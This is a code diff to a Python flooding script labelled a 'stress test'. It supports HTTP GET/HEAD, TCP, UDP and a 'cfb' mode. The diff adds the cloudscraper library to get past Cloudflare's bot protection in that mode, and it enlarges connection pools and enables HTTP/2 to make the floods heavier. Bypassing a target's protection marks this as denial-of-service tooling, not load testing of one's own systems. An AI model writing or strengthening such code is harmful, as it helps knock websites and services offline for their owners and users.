@@ -1,3 +1,4 @@
+import cloudscraper
 import httpx
 import socket
 import threading
@@ -17,7 +18,7 @@ elif protocol in ["tcp", "udp"]:
     port = int(input("Enter the port number: "))
 
 num_threads = int(input("Enter the number of threads to use: "))
-num_connections = int(input("Enter the maximum number of connections to use: "))
+num_connections = int(input("Enter the number of connections to use: "))
 duration = int(input("Enter the duration of the stress test in seconds: "))
 
 if protocol == "udp":
@@ -32,9 +33,10 @@ def stress_test(thread_id):
     global packet_counter
 
     if protocol == "cfb":
-        client = httpx.Client()
+        client = cloudscraper.create_scraper()
     elif protocol in ["get", "head"]:
-        client = httpx.Client(limits=httpx.Limits(max_connections=num_connections))
+        limits = httpx.Limits(max_connections=num_connections, max_keepalive_connections=num_connections)
+        client = httpx.Client(http2=True, limits=limits)
     elif protocol in ["tcp", "udp"]:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     else:
